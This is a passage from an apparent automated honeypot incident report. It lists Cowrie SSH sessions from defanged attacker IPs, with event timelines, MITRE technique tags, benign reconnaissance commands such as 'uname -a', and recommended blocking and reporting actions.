| `2026-07-31 05:12:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]36` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fdafe30bf69

| Field | Detail |
|---|---|
| **Source IP** | `23.254.222[.]201` |
| **First Seen** | 2026-07-31 05:13 |
| **Last Seen** | 2026-07-31 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:13:53` | `cowrie.session.connect` |
| `2026-07-31 05:13:53` | `cowrie.client.version` |
| `2026-07-31 05:13:53` | `cowrie.client.kex` |
| `2026-07-31 05:13:54` | `cowrie.login.success` |
| `2026-07-31 05:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.254.222[.]201` to AbuseIPDB if not already reported
- [ ] Block `23.254.222[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d2772b6088f

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-31 05:13 |
| **Last Seen** | 2026-07-31 05:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:13:55` | `cowrie.session.connect` |
| `2026-07-31 05:13:55` | `cowrie.client.version` |
| `2026-07-31 05:13:55` | `cowrie.client.kex` |
| `2026-07-31 05:13:55` | `cowrie.login.success` |
| `2026-07-31 05:13:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea76d40de950

| Field | Detail |
|---|---|
| **Source IP** | `200.232.114[.]71` |
| **First Seen** | 2026-07-31 05:16 |
| **Last Seen** | 2026-07-31 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:16:31` | `cowrie.session.connect` |
| `2026-07-31 05:16:32` | `cowrie.client.version` |
| `2026-07-31 05:16:32` | `cowrie.client.kex` |
| `2026-07-31 05:16:33` | `cowrie.login.success` |
| `2026-07-31 05:16:34` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:16:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.232.114[.]71` to AbuseIPDB if not already reported
- [ ] Block `200.232.114[.]71` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-827528e59f33

| Field | Detail |
|---|---|
| **Source IP** | `14.99.61[.]248` |
| **First Seen** | 2026-07-31 05:16 |
| **Last Seen** | 2026-07-31 05:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:16:39` | `cowrie.session.connect` |
| `2026-07-31 05:16:40` | `cowrie.client.version` |
| `2026-07-31 05:16:40` | `cowrie.client.kex` |
| `2026-07-31 05:16:42` | `cowrie.login.success` |
| `2026-07-31 05:16:42` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.99.61[.]248` to AbuseIPDB if not already reported
- [ ] Block `14.99.61[.]248` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f7b1458c7ac

| Field | Detail |
|---|---|
| **Source IP** | `34.140.177[.]161` |
| **First Seen** | 2026-07-31 05:17 |
| **Last Seen** | 2026-07-31 05:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:17:02` | `cowrie.session.connect` |
| `2026-07-31 05:17:02` | `cowrie.login.success` |
| `2026-07-31 05:17:03` | `cowrie.session.params` |
| `2026-07-31 05:17:03` | `cowrie.command.input` |
| `2026-07-31 05:17:03` | `cowrie.command.input` |
| `2026-07-31 05:17:03` | `cowrie.command.failed` |
| `2026-07-31 05:17:03` | `cowrie.command.input` |
| `2026-07-31 05:17:03` | `cowrie.log.closed` |
| `2026-07-31 05:17:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.177[.]161` to AbuseIPDB if not already reported
- [ ] Block `34.140.177[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f60b535c52

| Field | Detail |
|---|---|
| **Source IP** | `34.140.177[.]161` |
| **First Seen** | 2026-07-31 05:17 |
| **Last Seen** | 2026-07-31 05:17 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:17:16` | `cowrie.session.connect` |
| `2026-07-31 05:17:16` | `cowrie.login.success` |
| `2026-07-31 05:17:16` | `cowrie.session.params` |
| `2026-07-31 05:17:16` | `cowrie.command.input` |
| `2026-07-31 05:17:16` | `cowrie.command.failed` |
| `2026-07-31 05:17:30` | `cowrie.log.closed` |
| `2026-07-31 05:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.177[.]161` to AbuseIPDB if not already reported
- [ ] Block `34.140.177[.]161` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5150dc442379

| Field | Detail |
|---|---|
| **Source IP** | `34.140.177[.]161` |
| **First Seen** | 2026-07-31 05:17 |
| **Last Seen** | 2026-07-31 05:17 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:17:18` | `cowrie.session.connect` |
| `2026-07-31 05:17:18` | `cowrie.login.success` |
| `2026-07-31 05:17:18` | `cowrie.session.params` |
| `2026-07-31 05:17:18` | `cowrie.command.input` |
| `2026-07-31 05:17:30` | `cowrie.log.closed` |
| `2026-07-31 05:17:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.140.177[.]161` to AbuseIPDB if not already reported
- [ ] Block `34.140.177[.]161` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83703612c51d

| Field | Detail |
|---|---|
| **Source IP** | `47.253.5[.]130` |
| **First Seen** | 2026-07-31 05:21 |
| **Last Seen** | 2026-07-31 05:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:21:07` | `cowrie.session.connect` |
| `2026-07-31 05:21:07` | `cowrie.client.version` |
| `2026-07-31 05:21:07` | `cowrie.client.kex` |
| `2026-07-31 05:21:07` | `cowrie.login.success` |
| `2026-07-31 05:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.253.5[.]130` to AbuseIPDB if not already reported
- [ ] Block `47.253.5[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a4438758e70

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-31 05:21 |
| **Last Seen** | 2026-07-31 05:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:21:08` | `cowrie.session.connect` |
| `2026-07-31 05:21:08` | `cowrie.client.version` |
| `2026-07-31 05:21:08` | `cowrie.client.kex` |
| `2026-07-31 05:21:08` | `cowrie.login.success` |
| `2026-07-31 05:21:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0498430f475b

| Field | Detail |
|---|---|
| **Source IP** | `141.253.107[.]23` |
| **First Seen** | 2026-07-31 05:30 |
| **Last Seen** | 2026-07-31 05:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:30:25` | `cowrie.session.connect` |
| `2026-07-31 05:30:25` | `cowrie.client.version` |
| `2026-07-31 05:30:25` | `cowrie.client.kex` |
| `2026-07-31 05:30:25` | `cowrie.login.success` |
| `2026-07-31 05:30:26` | `cowrie.session.params` |
| `2026-07-31 05:30:26` | `cowrie.command.input` |
| `2026-07-31 05:30:26` | `cowrie.log.closed` |
| `2026-07-31 05:30:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.253.107[.]23` to AbuseIPDB if not already reported
- [ ] Block `141.253.107[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97367d4f2270

| Field | Detail |
|---|---|
| **Source IP** | `102.90.34[.]90` |
| **First Seen** | 2026-07-31 05:31 |
| **Last Seen** | 2026-07-31 05:36 |
| **Session Duration** | 302s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:31:32` | `cowrie.session.connect` |
| `2026-07-31 05:31:32` | `cowrie.client.version` |
| `2026-07-31 05:31:32` | `cowrie.client.kex` |
| `2026-07-31 05:31:34` | `cowrie.login.success` |
| `2026-07-31 05:31:34` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:36:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.90.34[.]90` to AbuseIPDB if not already reported
- [ ] Block `102.90.34[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3c5cb946093

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-07-31 05:33 |
| **Last Seen** | 2026-07-31 05:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:33:16` | `cowrie.session.connect` |
| `2026-07-31 05:33:17` | `cowrie.client.version` |
| `2026-07-31 05:33:17` | `cowrie.client.kex` |
| `2026-07-31 05:33:18` | `cowrie.login.success` |
| `2026-07-31 05:33:19` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:33:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbfa754a948d

| Field | Detail |
|---|---|
| **Source IP** | `118.45.255[.]153` |
| **First Seen** | 2026-07-31 05:33 |
| **Last Seen** | 2026-07-31 05:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:33:24` | `cowrie.session.connect` |
| `2026-07-31 05:33:25` | `cowrie.client.version` |
| `2026-07-31 05:33:25` | `cowrie.client.kex` |
| `2026-07-31 05:33:27` | `cowrie.login.success` |
| `2026-07-31 05:33:28` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:33:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.45.255[.]153` to AbuseIPDB if not already reported
- [ ] Block `118.45.255[.]153` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ea4e802b090

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]91` |
| **First Seen** | 2026-07-31 05:39 |
| **Last Seen** | 2026-07-31 05:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:39:41` | `cowrie.session.connect` |
| `2026-07-31 05:39:42` | `cowrie.login.success` |
| `2026-07-31 05:39:43` | `cowrie.session.params` |
| `2026-07-31 05:39:43` | `cowrie.command.input` |
| `2026-07-31 05:39:44` | `cowrie.command.input` |
| `2026-07-31 05:39:44` | `cowrie.command.input` |
| `2026-07-31 05:39:45` | `cowrie.command.input` |
| `2026-07-31 05:39:45` | `cowrie.command.failed` |
| `2026-07-31 05:39:46` | `cowrie.log.closed` |
| `2026-07-31 05:39:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]91` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4737f2bd5a1

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-07-31 05:42 |
| **Last Seen** | 2026-07-31 05:42 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:42:17` | `cowrie.session.connect` |
| `2026-07-31 05:42:17` | `cowrie.client.version` |
| `2026-07-31 05:42:17` | `cowrie.client.kex` |
| `2026-07-31 05:42:19` | `cowrie.login.success` |
| `2026-07-31 05:42:20` | `cowrie.direct-tcpip.request` |
| `2026-07-31 05:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c90c268172b7

| Field | Detail |
|---|---|
| **Source IP** | `141.253.107[.]23` |
| **First Seen** | 2026-07-31 05:55 |
| **Last Seen** | 2026-07-31 05:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 05:55:11` | `cowrie.session.connect` |
| `2026-07-31 05:55:11` | `cowrie.client.version` |
| `2026-07-31 05:55:11` | `cowrie.client.kex` |
| `2026-07-31 05:55:11` | `cowrie.login.success` |
| `2026-07-31 05:55:12` | `cowrie.session.params` |
| `2026-07-31 05:55:12` | `cowrie.command.input` |
| `2026-07-31 05:55:12` | `cowrie.log.closed` |
| `2026-07-31 05:55:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `141.253.107[.]23` to AbuseIPDB if not already reported
- [ ] Block `141.253.107[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5d2483420b3c

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-31 06:01 |
| **Last Seen** | 2026-07-31 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:01:30` | `cowrie.session.connect` |
| `2026-07-31 06:01:30` | `cowrie.client.version` |
| `2026-07-31 06:01:30` | `cowrie.client.kex` |
| `2026-07-31 06:01:31` | `cowrie.login.success` |
| `2026-07-31 06:01:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1f51b2bb4b9

| Field | Detail |
|---|---|
| **Source IP** | `158.178.141[.]210` |
| **First Seen** | 2026-07-31 06:01 |
| **Last Seen** | 2026-07-31 06:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:01:30` | `cowrie.session.connect` |
| `2026-07-31 06:01:30` | `cowrie.client.version` |
| `2026-07-31 06:01:30` | `cowrie.client.kex` |
| `2026-07-31 06:01:31` | `cowrie.login.success` |
| `2026-07-31 06:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `158.178.141[.]210` to AbuseIPDB if not already reported
- [ ] Block `158.178.141[.]210` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-602d33a66c88

| Field | Detail |
|---|---|
| **Source IP** | `220.80.224[.]223` |
| **First Seen** | 2026-07-31 06:05 |
| **Last Seen** | 2026-07-31 06:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:05:06` | `cowrie.session.connect` |
| `2026-07-31 06:05:06` | `cowrie.client.version` |
| `2026-07-31 06:05:06` | `cowrie.client.kex` |
| `2026-07-31 06:05:09` | `cowrie.login.success` |
| `2026-07-31 06:05:10` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:05:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.80.224[.]223` to AbuseIPDB if not already reported
- [ ] Block `220.80.224[.]223` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8744434afab9

| Field | Detail |
|---|---|
| **Source IP** | `207.175.151[.]21` |
| **First Seen** | 2026-07-31 06:07 |
| **Last Seen** | 2026-07-31 06:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:07:27` | `cowrie.session.connect` |
| `2026-07-31 06:07:27` | `cowrie.login.success` |
| `2026-07-31 06:07:27` | `cowrie.session.params` |
| `2026-07-31 06:07:27` | `cowrie.command.input` |
| `2026-07-31 06:07:27` | `cowrie.command.input` |
| `2026-07-31 06:07:27` | `cowrie.command.failed` |
| `2026-07-31 06:07:27` | `cowrie.command.input` |
| `2026-07-31 06:07:27` | `cowrie.log.closed` |
| `2026-07-31 06:07:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.151[.]21` to AbuseIPDB if not already reported
- [ ] Block `207.175.151[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6816ef7b0f

| Field | Detail |
|---|---|
| **Source IP** | `207.175.151[.]21` |
| **First Seen** | 2026-07-31 06:07 |
| **Last Seen** | 2026-07-31 06:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:07:40` | `cowrie.session.connect` |
| `2026-07-31 06:07:40` | `cowrie.login.success` |
| `2026-07-31 06:07:41` | `cowrie.session.params` |
| `2026-07-31 06:07:41` | `cowrie.command.input` |
| `2026-07-31 06:07:41` | `cowrie.command.failed` |
| `2026-07-31 06:07:53` | `cowrie.log.closed` |
| `2026-07-31 06:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.151[.]21` to AbuseIPDB if not already reported
- [ ] Block `207.175.151[.]21` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4c79116b86a

| Field | Detail |
|---|---|
| **Source IP** | `207.175.151[.]21` |
| **First Seen** | 2026-07-31 06:07 |
| **Last Seen** | 2026-07-31 06:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:07:42` | `cowrie.session.connect` |
| `2026-07-31 06:07:42` | `cowrie.login.success` |
| `2026-07-31 06:07:43` | `cowrie.session.params` |
| `2026-07-31 06:07:43` | `cowrie.command.input` |
| `2026-07-31 06:07:53` | `cowrie.log.closed` |
| `2026-07-31 06:07:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `207.175.151[.]21` to AbuseIPDB if not already reported
- [ ] Block `207.175.151[.]21` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4685e3e6bba2

| Field | Detail |
|---|---|
| **Source IP** | `203.129.225[.]4` |
| **First Seen** | 2026-07-31 06:08 |
| **Last Seen** | 2026-07-31 06:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:08:27` | `cowrie.session.connect` |
| `2026-07-31 06:08:28` | `cowrie.client.version` |
| `2026-07-31 06:08:28` | `cowrie.client.kex` |
| `2026-07-31 06:08:30` | `cowrie.login.success` |
| `2026-07-31 06:08:31` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.129.225[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.129.225[.]4` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ca7ec4e161f

| Field | Detail |
|---|---|
| **Source IP** | `63.135.169[.]175` |
| **First Seen** | 2026-07-31 06:08 |
| **Last Seen** | 2026-07-31 06:08 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:08:36` | `cowrie.session.connect` |
| `2026-07-31 06:08:37` | `cowrie.client.version` |
| `2026-07-31 06:08:37` | `cowrie.client.kex` |
| `2026-07-31 06:08:37` | `cowrie.login.success` |
| `2026-07-31 06:08:38` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:08:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `63.135.169[.]175` to AbuseIPDB if not already reported
- [ ] Block `63.135.169[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590d2ae84e21

| Field | Detail |
|---|---|
| **Source IP** | `124.239.129[.]2` |
| **First Seen** | 2026-07-31 06:08 |
| **Last Seen** | 2026-07-31 06:08 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:08:36` | `cowrie.session.connect` |
| `2026-07-31 06:08:37` | `cowrie.client.version` |
| `2026-07-31 06:08:37` | `cowrie.client.kex` |
| `2026-07-31 06:08:40` | `cowrie.login.success` |
| `2026-07-31 06:08:41` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.239.129[.]2` to AbuseIPDB if not already reported
- [ ] Block `124.239.129[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cc802395f56

| Field | Detail |
|---|---|
| **Source IP** | `186.179.80[.]12` |
| **First Seen** | 2026-07-31 06:08 |
| **Last Seen** | 2026-07-31 06:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:08:51` | `cowrie.session.connect` |
| `2026-07-31 06:08:51` | `cowrie.client.version` |
| `2026-07-31 06:08:51` | `cowrie.client.kex` |
| `2026-07-31 06:08:53` | `cowrie.login.success` |
| `2026-07-31 06:08:54` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:08:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.179.80[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.179.80[.]12` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ffad8914b33f

| Field | Detail |
|---|---|
| **Source IP** | `1.247.245[.]61` |
| **First Seen** | 2026-07-31 06:17 |
| **Last Seen** | 2026-07-31 06:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-31 06:17:46` | `cowrie.session.connect` |
| `2026-07-31 06:17:47` | `cowrie.client.version` |
| `2026-07-31 06:17:47` | `cowrie.client.kex` |
| `2026-07-31 06:17:49` | `cowrie.login.success` |
| `2026-07-31 06:17:50` | `cowrie.direct-tcpip.request` |
| `2026-07-31 06:17:55` | `cowrie.session.closed` |

